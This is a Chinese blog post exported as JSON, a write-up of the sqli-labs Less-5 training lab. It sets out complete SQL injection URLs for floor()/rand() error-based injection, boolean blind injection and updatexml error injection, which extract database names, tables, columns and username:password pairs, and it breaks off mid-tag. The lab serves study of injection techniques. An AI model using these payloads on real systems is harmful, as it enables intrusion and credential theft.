{"title":"盲注-SQL靶场","uid":"b9f032fc8c8fc6510bd3ac95f6665bcd","slug":"盲注-SQL靶场","date":"2022-02-02T12:12:53.000Z","updated":"2022-02-13T15:30:25.012Z","comments":true,"path":"api/articles/盲注-SQL靶场.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>Less-5和Less-6关看了很多文章，总的下来就是布尔盲注，报错注入和时间盲注，通过各种函数进行注入，在这里记录以下。</p>\n<h2 id=\"0x01（floor-报错）\"><a href=\"#0x01（floor-报错）\" class=\"headerlink\" title=\"0x01（floor()报错）\"></a>0x01（floor()报错）</h2><p>首先，开始注入的时候先是按照1-4关的注入方式探测了以下注入点，又看了一下源码，发现源码当中只能输出You are in……….</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202202635835.png\" alt=\"image-20220202202635835\"></p>\n<p>这时候才发现1-4关的注入方式已经在5关用不了了。</p>\n<p>但这里还是可以判断出字段数的：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; order by 4--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>根据回显，正确时就会返回You are in……….，错误时返回空。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202203008094.png\" alt=\"image-20220202203008094\"></p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202202947666.png\" alt=\"image-20220202202947666\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>开始注入以下语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select database()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>第一次点击，回显正常页面</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202204824647.png\" alt=\"image-20220202204824647\"></p>\n<p>第二次点击，爆出数据库（对于这样的情况需要多点击几次才能得到回显）</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202204902893.png\" alt=\"image-20220202204902893\"></p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202210149317.png\" alt=\"image-20220202210149317\"></p>\n<p>这里解析以下以上注入语句：</p>\n<p>select database()：查询数据库</p>\n<p>floor(rand()*2)：输出0或1</p>\n<p>concat((select database()),floor(rand()*2))：将查询到的数据库与取整的0或1拼接，如上图</p>\n<p>a：这里的a是将concat((select database()),floor(rand()*2))取的别名，得到的结果是a，此时的a有security0或security1两种情况，如上图</p>\n<p>group by：最后由group by函数将a进行分组，security0一组，security1一组</p>\n<p><strong>floor()函数报错分析：</strong></p>\n<p>　 <strong>因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）。</strong><br>　 <strong>在这里的意思就是，group by 进行分组时，<code>floor(rand(0)*2)</code>执行一次（查看分组是否存在），如果虚拟表中不在在该分组，那么在插入新分组的时候 <code>floor(rand(0)*2)</code> 就又计算了一次。</strong></p>\n<p>　　<strong>当我们使用<code>floor(rand(0)*2)</code>产生0和1两个随机数后，当在<code>group by</code> 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，<code>floor(rand(0)\\*2)</code>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后<code>floor(rand(0)*2)</code>又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！</strong></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>接下来爆版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select version()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202210651585.png\" alt=\"image-20220202210651585\"></p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>爆数据库用户名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select user()),floor(rand()*2)) as  a from information_schema.schemata group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202210909030.png\" alt=\"image-20220202210909030\"></p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>这里爆表名的时候出现了错误：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Subquery returns more than 1 row  子查询返回数据超过1行\n其实就是子查询返回数据时只能返回一条数据，但由于这里注入返回的结果超过了一行导致报错<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202211656117.png\" alt=\"image-20220202211656117\"></p>\n<p>注到这里，看了一下解决Subquery returns more than 1 row的办法，用limit字段限制多余查询</p>\n<p><strong>limit语法：limit M,N 是从第M+1条数据开始查询，查询出N条数据。</strong></p>\n<p>注入语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里一定要在子查询后面添加<strong>limit 0,1</strong>,如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202212813330.png\" alt=\"image-20220202212813330\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p>爆出所有表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202213030869.png\" alt=\"image-20220202213030869\"></p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><p>爆所有字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1 ),floor(rand()*2)) as  a from information_schema.columns  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202213249676.png\" alt=\"image-20220202213249676\"></p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><p>这里要爆用户名的时候同样用了爆列名时候的group_concat()函数，但试了很多次，没有回显用户名数据，只有You are in……….</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select group_concat(username) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202214749674.png\" alt=\"image-20220202214749674\"></p>\n<p>以至于改成下面的注入语句：</p>\n<p>不过这里只能通过控制<strong>limit字段</strong>来爆出用户名和密码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username, &#39;:&#39;,password,&#39;;&#39;) from users limit 0,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202214631827.png\" alt=\"image-20220202214631827\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*), concat((select concat(username,&#39;:&#39;,password,&#39;;&#39;) from users limit 1,1 ),floor(rand()*2)) as  a from information_schema.tables  group by a --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>以此类推。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202215303667.png\" alt=\"image-20220202215303667\"></p>\n<hr>\n<h2 id=\"0x01（无回显的布尔）\"><a href=\"#0x01（无回显的布尔）\" class=\"headerlink\" title=\"0x01（无回显的布尔）\"></a>0x01（无回显的布尔）</h2><p>探测数据库版本是否&gt;&#x3D;5，回显正常，数据库版本在5.0以上</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(version(),1)&gt;&#x3D;5 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202222007795.png\" alt=\"image-20220202222007795\"></p>\n<h2 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>利用length()函数探测数据库长度：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;10 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>页面错误，表示数据库长度不是10。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202222342805.png\" alt=\"image-20220202222342805\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>此时回显正常，数据库长度为8。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202222452003.png\" alt=\"image-20220202222452003\"></p>\n<h2 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>猜测数据库名第一位：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;a&#39;--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202223235772.png\" alt=\"image-20220202223235772\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202223307482.png\" alt=\"image-20220202223307482\"></p>\n<p>若数据库第一位大于a返回正常，如图1；若数据库第一位不大于s则返回异常，通常这样的情况需要从a~z每一个去判断，若回显异常，则就是数据库第一位字符。</p>\n<p>得知第一位是s，猜第二位，这里判断前两位是否大于sa即可：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sa&#39;--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里回显正常，表示第二位大于a</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202223948285.png\" alt=\"image-20220202223948285\"></p>\n<p>从a开始一个一个去试，发现到e的时候回显异常，证明第二位字符是e。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202224036469.png\" alt=\"image-20220202224036469\"></p>\n<p>剩下的字符根据得出的数据库的长度依次去猜每一位字符（这里可以写一个脚本去跑）</p>\n<h2 id=\"0x04-1\"><a href=\"#0x04-1\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>利用ascii()和substr()函数猜测表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里第一个表的第一个字符的ascii码&gt;100，回显正确</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202230834521.png\" alt=\"image-20220202230834521\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;101 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>大于101时回显错误，根据acsii码表可知，101是e，所以第一张表的第一个字符是e。</p>\n<p>（在实战当中，应该从a&#x3D;97开始猜测，一个一个去试）</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202231015624.png\" alt=\"image-20220202231015624\"></p>\n<p>第二个字符通过substr(**,2,1)进行猜测，剩下的字符以此类推。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;108 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202231524818.png\" alt=\"image-20220202231524818\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;109 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202231604072.png\" alt=\"image-20220202231604072\"></p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202230525691.png\" alt=\"image-20220202230525691\"></p>\n<p><strong>获取剩下的表：</strong></p>\n<p>上述的语句中使用的 limit 0,1； 意思就是从第 0 个开始，获取第一个。那要获取第二个就是limit 1,1</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;113 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>页面返回正常，表示第二张表的第一个字符&gt;113</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202232002600.png\" alt=\"image-20220202232002600\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;114 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>不大于114，证明第二张表的第一个字符是r，以后的过程就是不断的重复上面的。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202232109005.png\" alt=\"image-20220202232109005\"></p>\n<h2 id=\"0x05-1\"><a href=\"#0x05-1\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><p>利用 regexp 获取users表中的列：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^u[a-z]&#39; limit 0,1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>页面回显正常，判断出users表中有u开头的字段</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202234036314.png\" alt=\"image-20220202234036314\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^w[a-z]&#39; limit 0,1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>若无字符开头的字段，回显异常，如图：</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202234258789.png\" alt=\"image-20220202234258789\"></p>\n<p>依次进行正表达式猜列的字段名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>猜测出字段名后要判断是否正确，直接判断 table_name &#x3D; ‘username’即可 。 </p>\n<p>password字段同理。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220202234646758.png\" alt=\"image-20220202234646758\"></p>\n<p><strong>表达式更换如下：</strong></p>\n<p><strong>‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</strong></p>\n<p><strong>（在更换到’^news[a-z]’这步时会报错，此时写news即可。）</strong></p>\n<h2 id=\"0x06-1\"><a href=\"#0x06-1\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><p><strong>利用 ord()和 mid()函数获取 users表的内容</strong></p>\n<p>IFNULL() 函数：用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。IFNULL(expression, alt_value)</p>\n<p>CAST()函数：用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。</p>\n<p>cast(username as char)：表示将username表达式转换为char类型。</p>\n<p>ORD()：返回第一个字符的ASCII码。</p>\n<p>ORDER BY 关键字默认按照升序对记录进行排序。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>结果返回正常，证明username字段中第一个用户名的第一个字符是D；接下来重复造轮子即可。</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203001328114.png\" alt=\"image-20220203001328114\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&#x3D;68 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>代码解析：先从users表中查询到username字段，然后执行cast(username as char)，将字段username转换为char类型，如果没有username字段，ifnull()函数将返回0x20（这里如果返回0x20已经没什么意义了，不需要继续了），按照id升序的方式排列，之后执行mid()函数，将查询到的用户名从第1位开始截取长度为1的字符，然后在执行ord()函数，将截取的字符转换为acsii码与68进行比较。<strong>此处的0x20是十六进制的ascii，表示空格</strong></p>\n<hr>\n<h2 id=\"0x01（XPATH函数报错）\"><a href=\"#0x01（XPATH函数报错）\" class=\"headerlink\" title=\"0x01（XPATH函数报错）\"></a>0x01（XPATH函数报错）</h2><p>###updatexml(XML_document, XPath_string, new_value)</p>\n<p>XML_document：是文档对象的名称</p>\n<p>XPath_string：是XPath格式的字符串（<strong>如果XPath_string不是XPath格式，则会报错并显示出XPath_string的值）</strong></p>\n<p>new_value：替换查找到的数据</p>\n<p>XPath语法介绍:<a href=\"https://blog.csdn.net/dearbaba_8520/article/details/81557827\">https://blog.csdn.net/dearbaba_8520/article/details/81557827</a></p>\n<p>常用注入语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">updatexml(1,concat(1,payload),1)。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>concat()函数用于将多个字符串连接成一个字符串,目的是让拼接后的字符串不符合XPath格式使其报错,显示出要查的对象。</strong></p>\n<p><strong>最终的目的是使其报错，至于拼接的值多种多样，并不局限于1。</strong></p>\n<p>如图：</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203205634875.png\" alt=\"image-20220203205634875\"></p>\n<h2 id=\"0x02-2\"><a href=\"#0x02-2\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><p>注入语句：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里的<code>0x7eASCII是~</code>,<code>updatexml()</code>报错信息为特殊字符，字母及之后的内容，为了前面字母丢失，开头连接一个特殊字符~。（并不局限于0x7e）</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203210618677.png\" alt=\"image-20220203210618677\"></p>\n<h2 id=\"0x03-2\"><a href=\"#0x03-2\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><p>爆版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select version()),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203211223581.png\" alt=\"image-20220203211223581\"></p>\n<p>爆数据库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆列名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203212659594.png\" alt=\"image-20220203212659594\"></p>\n<p>爆列名的时候用group_concat()函数没有爆出关键字段，这里需要控制<strong>limit 0,1</strong>爆出关键字段。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆出用户名：</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203212908733.png\" alt=\"image-20220203212908733\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e),1) --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆出密码：</p>\n<p><img src=\"/post/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA.htm/image-20220203212946551.png\" alt=\"image-20220203212946551\"></p>\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1) --+<span aria-hidden=\"true\" 